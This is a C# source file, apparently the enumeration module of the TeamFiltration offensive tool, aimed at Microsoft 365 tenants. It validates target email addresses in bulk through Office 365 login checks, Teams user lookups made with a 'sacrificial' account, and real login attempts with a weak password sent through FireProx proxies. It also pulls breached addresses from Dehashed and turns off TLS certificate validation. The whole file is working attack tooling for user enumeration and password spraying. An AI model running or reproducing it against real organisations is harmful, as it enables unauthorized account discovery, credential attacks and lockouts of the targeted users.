using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net.Http;
using System.Security.Authentication;
using System.Text.RegularExpressions;
using TeamFiltration.Models.Teams;
using TeamFiltration.Models.MSOL;
using System.Threading.Tasks;
using System.IO;
using TeamFiltration.Handlers;
using TeamFiltration.Models.TeamFiltration;
using TeamFiltration.Helpers;
using System.Threading.Tasks.Dataflow;
using System.Collections.Concurrent;
using Dasync.Collections;
using System.Threading;
using System.Net.Http.Headers;

namespace TeamFiltration.Modules
{
    public class EnumOptions
    {

        public EnumOptions(string[] args)
        {
            if (args.Contains("--validate-msol"))
                this.ValidateAccsO365 = true;

            if (args.Contains("--validate-teams"))
                this.ValidateAccsTeams = true;

            if (args.Contains("--validate-login"))
                this.ValidateAccsLogin = true;

            if (args.Contains("--enum-mfa"))
                this.EnumMFA = true;

            if (args.Contains("--dehashed"))
                this.Dehashed = true;
        }

        public bool EnumMFA { get; set; }
        public bool ValidateAccsTeams { get; set; }
        public bool ValidateAccsO365 { get; set; }
        public bool ValidateAccsLogin { get; set; }
        public bool Dehashed { get; set; }
    }

    class Enumerate
    {

        public static GlobalArgumentsHandler _globalProperties { get; set; }
        public static DatabaseHandler _databaseHandle { get; set; }
        public static List<string> _teamsObjectIds = new List<string>() { };

        public static async Task ValidUserWrapperTeams(TeamsHandler teamsHandler, string username)
        {
            try
            {

                //TODO: Should probably make it so that it does not re-enum invalid accounts
                var validUser = await teamsHandler.EnumUser(username);


                if (validUser.isValid && !string.IsNullOrEmpty(validUser.objectId))
                {
                    //check list and add
                    if (!_teamsObjectIds.Contains(validUser.objectId))
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid!", ""));

                        try
                        {
                            _databaseHandle.WriteValidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString(), objectId = validUser.objectId });
                        }
                        catch (Exception ex)
                        {

                            //LiteDB needs to fix their crap
                        }

                    }
                    else
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid, but duplicate", ""));
                    }
                }
                else if (validUser.isValid && string.IsNullOrEmpty(validUser.objectId))
                {
                    _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid!", ""));

                    try
                    {
                        _databaseHandle.WriteValidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString(), objectId = validUser.objectId });

                    }
                    catch (Exception)
                    {

                        //LiteDB needs to fix their crap
                    }
                }
                /*
                 * There is a "bug" in litedb that makes it unable to handle more then 300/s transactions a second
                else if (!validUser.isValid)
                {
                    //User is not valid, let's note that down
                    _databaseHandle.WriteInvalidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString(), objectId = validUser.objectId });
                }*/
            }
            catch (Exception ex)
            {

                Console.WriteLine($"Failed to enum {username}, error: {ex}");
            }
        }
        public static async Task<bool> CheckO365Method(MSOLHandler msolHandler, string domain)
        {
            var randomUsername = Guid.NewGuid().ToString().Replace("-", "") + domain;
            var validUser = await msolHandler.ValidateO365Account(randomUsername, true, false);
            return !validUser;
        }
        public static async Task<bool> ValidUserWrapperLogin(MSOLHandler msolHandler, string username, string tempPassword)
        {

            var fireProxHolder = _globalProperties.GetFireProxURL();
            var rescHolder = Helpers.Generic.RandomO365Res();

            var sprayAttempt = new SprayAttempt()
            {
                Username = username,
                Password = tempPassword,
                FireProxURL = fireProxHolder,
                FireProxRegion = fireProxHolder.Split('.')[2].Split('.')[0],
                ResourceClientId = rescHolder.clientId,
                ResourceUri = rescHolder.Uri
            };


            var loginResp = await msolHandler.LoginAttemptFireProx(username, tempPassword, fireProxHolder, rescHolder, true);

            if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
            {
                _databaseHandle.WriteLog(new Log("ENUM", $"{username} => VALID NO MFA!"));
                _databaseHandle.WriteValidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString() });
                sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
                sprayAttempt.Valid = true;

            }
            else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
            {
                var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
                var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();

                //Set a default response
                var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);

                //Try to parse
                Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);

                if (!errorCodeOut.disqualified)
                {
                    if (errorCodeOut.valid)
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"{username} => {errorCodeOut.msg}"));
                        _databaseHandle.WriteInvalidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString(), objectId = "" });
                    }
                    else
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"{username} => VALID"));
                        _databaseHandle.WriteValidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString() });
                    }
                }
    
                sprayAttempt.ResponseCode = respCode;
                sprayAttempt.Valid = errorCodeOut.valid;
                sprayAttempt.Disqualified = errorCodeOut.disqualified;
                sprayAttempt.ConditionalAccess = errorCodeOut.accessPolicy;




            }

            _databaseHandle.WriteSprayAttempt(sprayAttempt);


            return false;
        }

        public static async Task ValidUserWrapperO365(MSOLHandler msolHandler, string username)
        {

            var validUser = await msolHandler.ValidateO365Account(username, true);
            if (validUser)
            {
                _databaseHandle.WriteLog(new Log("ENUM", $"{username} valid!", ""));

                _databaseHandle.WriteValidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString() });

            }
            else if (!validUser)
            {
                //User is not valid, let's note that down
                _databaseHandle.WriteInvalidAcc(new ValidAccount() { Username = username, Id = Helpers.Generic.StringToGUID(username).ToString(), objectId = "" });
            }

        }
        public static async Task EnumerateAsync(string[] args)
        {


            _globalProperties = new Handlers.GlobalArgumentsHandler(args);

            var usernameListPath = args.GetValue("--usernames");

            _databaseHandle = new DatabaseHandler(_globalProperties);

            var options = new EnumOptions(args);

            if (options.ValidateAccsLogin == false && options.ValidateAccsO365 == false && options.ValidateAccsTeams == false && options.Dehashed == false)
            {
                _databaseHandle.WriteLog(new Log("[+]", $"Please select an validation options! (eg --validate-teams) ", ""));
                Environment.Exit(0);
            }

            string domain = "";
            var msolHandler = new MSOLHandler(_globalProperties, "ENUM", _databaseHandle);
            var userListData = new string[] { };

            if (!string.IsNullOrEmpty(usernameListPath))
            {
                var usernameLines = File.ReadAllLines(usernameListPath);
                if (usernameLines.Count() > 0)
                {
                    userListData = usernameLines.Select(x => x.Trim().ToLower()).Distinct().ToArray();
                    if (!userListData.FirstOrDefault().Contains("@"))
                    {
                        Console.WriteLine("[+] The username list provided needs to be in the format username@company.com!");
                        Environment.Exit(0);

                    }
                    domain = "@" + userListData.FirstOrDefault().Split("@")[1];
                }
                else
                {
                    Console.WriteLine("[!] Usernames list provided is emtpy!");
                    Environment.Exit(0);
                }
            }
            else if (options.Dehashed && args.Contains("--domain"))
            {

                var dehashedHandler = new DehashedHandler(_globalProperties);

                var dehashedData = await dehashedHandler.FetchDomainEntries(args.GetValue("--domain"));

                foreach (var email in dehashedData.entries.Select(x => x.email).Distinct().Where(a => Helpers.Generic.IsValidEmail(a)))
                {
                    _databaseHandle.WriteLog(new Log("ENUM", $"{email} valid!", ""));
                    _databaseHandle.WriteValidAcc(new ValidAccount() { Username = email, Id = Helpers.Generic.StringToGUID(email).ToString(), objectId = "" });

                }
                //Pull out all the usernames and smack them into the DB

            }
            else if (args.Contains("--domain"))
            {

                domain = args.GetValue("--domain");

                //To avoid SSL errors
                var httpClientHandler = new HttpClientHandler
                {
                    ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                    {
                        return true;
                    },
                    SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls
                };


                using (var httpClient = new HttpClient(httpClientHandler))
                {
                    var gitHubDict = new Dictionary<int, string>() { };

                    gitHubDict.Add(1, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/john.smith.txt");
                    gitHubDict.Add(2, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/john.txt");
                    gitHubDict.Add(3, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/johnjs.txt");
                    gitHubDict.Add(4, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/johns.txt");
                    gitHubDict.Add(5, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/johnsmith.txt");
                    gitHubDict.Add(6, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/jsmith.txt");
                    gitHubDict.Add(7, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/smith.txt");
                    gitHubDict.Add(8, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/smithj.txt");
                    gitHubDict.Add(9, "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/john_smith.txt");


                    foreach (var usernameDict in gitHubDict)
                    {
                        Console.WriteLine($"    |=> [{usernameDict.Key}] " + usernameDict.Value.Split(@"/")[6].Replace(".txt", "@" + domain));
                    }
                    Console.WriteLine();
                    Console.Write("[?] Select an email format #> ");
                    var selection = Convert.ToInt32(Console.ReadLine());
                    var userListReq = await httpClient.PollyGetAsync(gitHubDict.GetValueOrDefault(selection));
                    userListData = (await userListReq.Content.ReadAsStringAsync()).Split("\n").Where(x => !string.IsNullOrEmpty(x)).Select(x => x + $"@{domain}").ToArray();
                    //  userListData = (await Helpers.Generic.GenerateCombinations()).ToArray();
                }


            }

            try
            {
                if (options.ValidateAccsO365 || options.ValidateAccsTeams || options.ValidateAccsLogin)
                {


                    var currentValidAccounts = _databaseHandle.QueryValidAccount().Where(a => a != null).Select(x => x?.Username?.ToLower());
                    var currentInvalidAccounts = _databaseHandle.QueryInvalidAccount().Select(x => x.Username.ToLower());

                    _databaseHandle.WriteLog(new Log("ENUM", $"Filtering out previusly attempted accounts", ""));

                    userListData = userListData.Except(currentValidAccounts).ToArray();
                    userListData = userListData.Except(currentInvalidAccounts).ToArray();
                }

                if (options.ValidateAccsO365)
                {
                    var approcTime = (int)Math.Round(TimeSpan.FromSeconds((double)userListData.Count() / 20).TotalMinutes);

                    _databaseHandle.WriteLog(new Log("ENUM", $"Warning, this method may give some false positive accounts", ""));
                    _databaseHandle.WriteLog(new Log("ENUM", $"Enumerating { userListData.Count() } possible accounts, this will take ~{approcTime} minutes", ""));

                    //Check if this options is possible
                    if (await CheckO365Method(msolHandler, $"@{domain}"))
                    {

                        foreach (var item in Helpers.Generic.SplitList<string>(userListData.ToList(), 20))
                        {
                            //Check 20 users
                            await userListData.ParallelForEachAsync(
                                async user =>
                                {
                                    await ValidUserWrapperO365(msolHandler, user);

                                },
                            maxDegreeOfParallelism: 20);

                            //Test canary
                            //if (!(await CheckO365Method(msolHandler, $"@{domain}")))
                            //    Console.WriteLine("Output will be wrong");
                        }

                    }
                    else
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", "o365 validation method unavailable for this tentant, try teams method!"));

                    }
                }
                else if (options.ValidateAccsTeams)
                {
                    if (Helpers.Generic.IsValidEmail(_globalProperties?.TeamFiltrationConfig?.SacrificialO365Username) && !string.IsNullOrEmpty(_globalProperties?.TeamFiltrationConfig?.SacrificialO365Passwords))
                    {
                        var approcTime = (int)Math.Round(TimeSpan.FromSeconds(((double)userListData.Count() / 300)).TotalMinutes);

                        _databaseHandle.WriteLog(new Log("ENUM", $"Enumerating { userListData.Count() } possible accounts, this will take ~{approcTime} minutes", ""));

                        var teamsToken = await msolHandler.LoginAttemptFireProx(_globalProperties.TeamFiltrationConfig.SacrificialO365Username, _globalProperties.TeamFiltrationConfig.SacrificialO365Passwords, _globalProperties.GetFireProxURL(), ("https://api.spaces.skype.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));

                        if (teamsToken.bearerToken != null)
                        {

                            _databaseHandle.WriteLog(new Log("ENUM", $"Successfully got Teams token for sacrificial account", ""));

                            TeamsHandler teamsHandler = new TeamsHandler(teamsToken.bearerToken, _globalProperties);

                            //Pull out objectId's
                            var previusValidAccs = _databaseHandle.QueryValidAccount();
                            if (previusValidAccs.Count() > 0)
                            {
                                _teamsObjectIds = previusValidAccs?.Select(x => x?.objectId).ToList();
                            }


                            //We need a skype token to get other stuff
                            await teamsHandler.SetSkypeToken();

                            _databaseHandle.WriteLog(new Log("ENUM", $"Loaded {userListData.Count()} usernames", ""));
                            await userListData.ParallelForEachAsync(
                            async user =>
                            {


                                await ValidUserWrapperTeams(teamsHandler, user);



                            },
                            maxDegreeOfParallelism: 300);
                        }
                    }
                    else
                    {
                        _databaseHandle.WriteLog(new Log("ENUM", $"Teams enumeration failed, lack of Sacrificial O365 Username and/or password", ""));

                    }
                }
                else if (options.ValidateAccsLogin)
                {
                    var approxTime = (int)Math.Round(TimeSpan.FromSeconds((userListData.Count() / 100)).TotalMinutes);
                    var tempPw = Helpers.Generic.GenerateWeakPasswords().FirstOrDefault();
                    _databaseHandle.WriteLog(new Log("ENUM", $"Warning, THIS METHOD WILL PRODUCE LOGIN ATTEMPTS AND IF USED FREQUENTLY,MAY LOCKOUT ACCOUNTS!", ""));
                    _databaseHandle.WriteLog(new Log("ENUM", $"Enumerating { userListData.Count() } accounts with password {tempPw}, this will take ~{approxTime} minutes", ""));


                    await userListData.ParallelForEachAsync(
                        async user =>
                        {
                            await ValidUserWrapperLogin(msolHandler, user, tempPw);

                        },
                        maxDegreeOfParallelism: 100);

                }


            }
            catch (Exception ex)
            {

                _databaseHandle.WriteLog(new Log("ENUM", $"SOFT ERROR ENUM  => {ex.Message}", ""));
            }

        }

        public static async Task EnumAccountAsync(string username, string password, EnumOptions enumOptions)
        {
            var msolHandler = new MSOLHandler(_globalProperties, "ENUM");
            if (enumOptions.EnumMFA)
            {
                var teamsToken = await msolHandler.GetToken(username, password, "https://api.spaces.skype.com", true);

                if (teamsToken?.TokenResp != null)
                    _databaseHandle.WriteLog(new Log("ENUM", $"Authenticated successfully, no MFA enforced", ""));


            }
        }
    }
}
